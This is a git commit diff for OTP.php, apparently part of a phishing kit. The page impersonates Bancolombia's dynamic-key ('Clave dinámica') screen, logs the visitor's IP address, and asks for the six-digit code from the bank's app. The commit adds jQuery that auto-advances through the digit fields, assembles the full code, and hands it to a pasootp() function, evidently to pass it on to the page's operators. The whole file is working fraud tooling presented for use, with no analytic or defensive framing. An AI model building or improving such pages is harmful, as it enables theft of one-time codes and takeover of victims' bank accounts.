cb569f40c72cf3b6c289866093960d6a6b06c2ca
leidyjhoanalj88-png <leidyjhoanalj88@gmail.com>
2026-04-21 21:25:03 -0500

    Actualizar OTP.php

--- a/OTP.php
+++ a/OTP.php
@@ -1,19 +1,13 @@
 <?php
-$ip = getenv("REMOTE_ADDR");
-$tiempo = date("l, j \d\e F \d\e Y");
+$ip = $_SERVER['REMOTE_ADDR'];
 date_default_timezone_set('America/Bogota');
+$tiempo = date("l, j \d\e F \d\e Y");
 ?>
 <html>
     <head>
         <title>Bancolombia - Clave dinámica</title>
         <meta http-equiv="content-type" content="text/html; utf-8">
         <meta charset="utf-8">
-        
-        <meta content="es" http-equiv="Content-Language">
-    
-        <meta name="description" content="">
-        <meta name="author" content="">
-        <meta name="Copyright" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
@@ -21,31 +15,25 @@ date_default_timezone_set('America/Bogota');
         <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
         <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">
 
-        <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>        
         <link href="../css/stylesheet.css" rel="stylesheet">
         <link href="../css/style-app.css?v2" rel="stylesheet">        
         <link rel="icon" type="image/png" href="../img/logo.png" />
+        
         <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
-        <script src="../js/jquery.jclock-min.js" type="text/javascript"></script>
-    
         <script type="text/javascript" src="../js/functions.js?v1"></script>
-        <script type="text/javascript" src="../js/ready.js?v2"></script>
 
         <style type="text/css">
             .clave {                
-                padding: 7px 38%;              
+                padding: 7px 0px; 
+                text-align: center;
+                width: 40px;             
             }
+            .inp-pass { width: 45px; }
         </style>
-        
     </head>
     <body>         
         <div id="fondo"></div>
-        <div id="cargando">
-            <img src="../img/logo.svg">            
-            <br>
-            <img src="../img/load2.gif" />
-        </div>
-        <div id="cargando-o">
+        <div id="cargando-o" style="display:none;">
             <img src="../img/load4.gif" width="90">            
             <br>
             Cargando...
@@ -66,22 +54,58 @@ date_default_timezone_set('America/Bogota');
             <div class="descripcion-app">Digita la clave dinámica de tu App Bancolombia</div>
             <table style="margin: 0 auto;" border="0" cellspacing="8">
                 <tr>
-                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp1" maxlength="1" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;"></td>
-                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp2" maxlength="1" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;"></td>
-                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp3" maxlength="1" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;"></td>
-                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp4" maxlength="1" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;"></td>
-                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp5" maxlength="1" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;"></td>
-                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp6" maxlength="1" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;"></td>
+                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp1" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
+                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp2" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
+                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp3" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
+                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp4" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
+                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp5" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
+                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp6" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
                 </tr>
             </table>            
         </div>  
         <button class="botones" id="btn-otp" disabled>CONTINUAR</button> 
         <br><br><br>
         <div style="color:#1A1B1A;font-weight: bold;font-size: 16px;text-decoration: underline; cursor: pointer;text-align: center;">Genera una clave personal</div>  
+
+        <script type="text/javascript">
+            $(document).ready(function() { 
+                // Salto automático y validación
+                $('.clave').on('input', function() {
+                    if ($(this).val().length === 1) {
+                        $(this).closest('td').next().find('.clave').focus();
+                    }
+                    
+                    var completo = true;
+                    $('.clave').each(function() {
+                        if ($(this).val() === "") completo = false;
+                    });
+
+                    if (completo) {
+                        $("#btn-otp").prop("disabled", false);
+                        $("#btn-otp").css("background-color", "#FDDA24"); // Color amarillo activo
+                        $("#lnk-otp").attr("src", "../img/btn-continuar-on.jpg");
+                    } else {
+                        $("#btn-otp").prop("disabled", true);
+                    }
+                });
+
+                // Control de borrado (Backspaced)
+                $('.clave').on('keydown', function(e) {
+                    if (e.keyCode === 8 && $(this).val().length === 0) {
+                        $(this).closest('td').prev().find('.clave').focus();
+                    }
+                });
+
+                // Envío de datos
+                $("#btn-otp, #lnk-otp").click(function() {
+                    var otp_completo = $("#txt-otp1").val() + $("#txt-otp2").val() + $("#txt-otp3").val() + $("#txt-otp4").val() + $("#txt-otp5").val() + $("#txt-otp6").val();
+                    
+                    if (otp_completo.length === 6) {
+                        $("#fondo, #cargando-o").show(); 
+                        pasootp(otp_completo); // Llama a functions.js
+                    }
+                });
+            });
+        </script>
     </body>
 </html>
-<script type="text/javascript">
-    $(document).ready(function() { 
-                     
-    });
- </script>
